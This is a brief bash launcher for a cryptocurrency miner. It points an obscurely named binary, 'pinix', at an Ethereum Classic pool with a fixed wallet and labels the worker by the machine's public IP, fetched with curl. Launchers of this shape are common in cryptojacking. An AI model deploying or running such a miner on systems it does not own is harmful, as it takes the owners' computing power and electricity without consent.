#!/bin/bash

POOL=ssl://us1-etc.ethermine.org:5555
WALLET=0xeda9774264112a15245cf5eda7f9c1b2fe6bf63e
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )

cd "$(dirname "$0")"

chmod +x ./pinix && ./pinix -pool $POOL -wal $WALLET.$WORKER -coin etc $@
